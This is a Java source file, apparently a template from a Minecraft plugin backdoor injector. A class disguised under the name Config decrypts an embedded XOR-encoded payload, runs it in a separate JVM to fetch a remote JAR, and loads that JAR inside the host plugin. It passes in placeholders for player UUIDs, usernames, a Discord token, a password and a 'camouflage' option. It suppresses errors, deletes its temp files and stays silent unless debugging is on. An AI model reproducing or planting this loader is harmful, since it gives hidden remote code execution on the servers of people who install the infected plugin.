package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public final class Config {

    public Config(Plugin plugin) {
        initialize(plugin);
    }

    private void initialize(Plugin plugin) {
        final boolean isDebugEnabled = "::TRUE::".equals("::WARNINGS::");

        if (System.getProperty("openbd.lock") != null) {
            return;
        }

        try {
            try {
                System.setProperty("openbd.lock", "true");
            } catch (Exception ignored) {
                return;
            }

            Path tempDir = null;
            String downloadedJarPath = null;
            String mainClassName = null;

            try {
                final String key = "::KEY::";
                final String downloaderClassName = "::DOWNLOADER_CLASS_NAME::";

                int[] fromBase64Table = new int[256];
                Arrays.fill(fromBase64Table, -1);
                String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for (int i = 0; i < chars.length(); i++) {
                    fromBase64Table[chars.charAt(i)] = i;
                }
                fromBase64Table['='] = -2;

                String src = "::ENCRYPTED_PAYLOAD::".replaceAll("\\s", "");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                int[] buffer = new int[4];
                int bufferCounter = 0;
                for (int i = 0; i < src.length(); i++) {
                    int val = fromBase64Table[src.charAt(i) & 0xFF];
                    if (val >= 0) {
                        buffer[bufferCounter++] = val;
                        if (bufferCounter == 4) {
                            baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                            baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                            baos.write((buffer[2] << 6) | buffer[3]);
                            bufferCounter = 0;
                        }
                    } else if (val == -2) {
                        if (bufferCounter == 2) baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        else if (bufferCounter == 3) {
                            baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                            baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                        }
                        break;
                    }
                }
                
                byte[] encryptedBytes = baos.toByteArray();
                byte[] keyBytes = key.getBytes("UTF-8");
                byte[] decryptedBytecode = new byte[encryptedBytes.length];
                for (int i = 0; i < encryptedBytes.length; i++) {
                    decryptedBytecode[i] = (byte) (encryptedBytes[i] ^ keyBytes[i % keyBytes.length]);
                }
                
                tempDir = Files.createTempDirectory("bd-");
                String packagePath = downloaderClassName.substring(0, downloaderClassName.lastIndexOf('.')).replace('.', '/');
                Path packageDir = tempDir.resolve(packagePath);
                Files.createDirectories(packageDir);
                
                Path tempClassFile = packageDir.resolve(downloaderClassName.substring(downloaderClassName.lastIndexOf('.') + 1) + ".class");
                Files.write(tempClassFile, decryptedBytecode);
                
                String javaExecutable = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
                ProcessBuilder processBuilder = new ProcessBuilder(javaExecutable, "-cp", tempDir.toString(), downloaderClassName);
                
                processBuilder.redirectErrorStream(true);
                Process process = processBuilder.start();
                
                List<String> outputLines = new ArrayList<>();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        outputLines.add(line);
                    }
                }
                process.waitFor();
                
                if (process.exitValue() == 0 && outputLines.size() >= 2) {
                    downloadedJarPath = outputLines.get(0);
                    mainClassName = outputLines.get(1);
                }
            } finally {
                if (tempDir != null) {
                    try {
                        Files.walk(tempDir).sorted((a, b) -> b.compareTo(a)).forEach(p -> {
                            try { Files.delete(p); } catch (Exception ignored) {}
                        });
                    } catch (Exception ignored) {}
                }
            }

            if (downloadedJarPath == null || mainClassName == null) {
                 if (isDebugEnabled) {
                    plugin.getLogger().severe("[Loader] Failed to fetch resource or main class. Aborting.");
                }
                return;
            }

            URL payloadUrl = new File(downloadedJarPath).toURI().toURL();
            URLClassLoader payloadClassLoader = new URLClassLoader(new URL[]{payloadUrl}, plugin.getClass().getClassLoader());
            Class<?> finalPayloadClass = payloadClassLoader.loadClass(mainClassName);

            Constructor<?> targetConstructor = null;
            Class<?>[] expectedParamTypes = {
                Plugin.class, Class.class, String.class, String.class,
                String.class, String.class, String.class, String.class,
                String.class, String.class
            };

            for (Constructor<?> constructor : finalPayloadClass.getConstructors()) {
                if (Arrays.equals(constructor.getParameterTypes(), expectedParamTypes)) {
                    targetConstructor = constructor;
                    break;
                }
            }
            
            if (targetConstructor == null) {
                throw new NoSuchMethodException("Could not find a suitable constructor in " + finalPayloadClass.getName());
            }

            targetConstructor.newInstance(
                plugin,
                this.getClass(),
                "::UUIDS::", "::USERNAMES::", "::PREFIX::", "::INJECT_OTHER::",
                "::WARNINGS::", "::DISCORD_TOKEN::", "::PASSWORD::", "::CAMOUFLAGE::"
            );

            if (isDebugEnabled) {
                plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");
            }

        } catch (Throwable e) {
            if (isDebugEnabled) {
                plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
                e.printStackTrace();
            }
        } finally {
            System.clearProperty("openbd.lock");
        }
    }
}